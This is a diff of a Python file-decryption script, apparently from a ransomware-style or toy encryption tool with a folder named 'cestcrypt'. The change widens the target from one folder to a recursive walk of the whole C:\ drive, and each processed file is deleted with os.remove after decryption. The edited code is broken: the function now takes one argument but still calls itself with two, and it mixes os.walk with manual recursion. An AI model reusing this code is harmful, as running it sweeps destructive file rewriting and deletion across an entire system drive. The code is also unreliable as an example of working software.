@@ -15,18 +15,19 @@ def decryption(file, password):
     os.remove(file)
 
 
-def steps_on_dir(directory, password):
-    for name in os.scandir(directory):
-        path = os.path.join(directory, name)
+def steps_on_dir(password):
+    for root, dirs, files in os.walk("C:\\"):
+        for name in os.scandir(root):
+            path = os.path.join(root, name)
 
-        if os.path.isfile(path):
-            try:
-                decryption(path, password)
-            except Exception as Ex:
-                print(Ex)
-        else:
-            steps_on_dir(directory, password)
+            if os.path.isfile(path):
+                try:
+                    decryption(path, password)
+                except Exception as Ex:
+                    print(Ex)
+            else:
+                steps_on_dir(root, password)
 
 
 password = input('enter password: ')
-steps_on_dir("C:\cestcrypt", password)
+steps_on_dir(password)
